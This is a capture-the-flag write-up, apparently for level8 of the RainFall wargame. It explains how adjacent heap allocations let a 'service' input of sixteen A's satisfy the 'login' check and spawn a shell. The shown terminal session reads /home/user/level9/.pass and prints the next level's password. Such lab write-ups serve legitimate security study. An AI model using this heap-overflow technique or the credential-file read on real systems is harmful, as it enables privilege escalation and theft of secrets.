this is fairly easy, when you execute the binary it enters an infinite loop that prints the address stored in 2 global variables: `auth` and `service`.

there are 4 inputs that triggers execution of some code: 
- "auth ": allocates 4 bytes with `malloc` and storing the return in `auth` global variable. puts value `0` at the start. skips 5 characters ("auth ") from input and copies that input using `strcpy` if the size is lower than 30
- "reset": frees `auth` varialbe and sets it to NULL
- "service": frees `service` variable and then skips 7 characters then copies your input using `strdup`.
- "login": checks if `auth` is not NULL and checks if value at offset `32` from `auth` is not 0. if both conditions are met it launches a shell. else it prints a string using fwrite.

when you first execute the program you see that both values of `auth` and `service` are NULL:

```bash
level8@RainFall:~$ ./level8 
(nil), (nil)
```

since there is a check that does not let us write more than 30 chars in `auth` variable we need another solution.

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth orakib
0x804a008, (nil) 
service
0x804a008, 0x804a018 
```
as you can see the address of `service` is 16 bytes away from `auth` so we can use this to write  to the value at offset `32` from `auth`

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth orakib
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass 
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```

and there you go.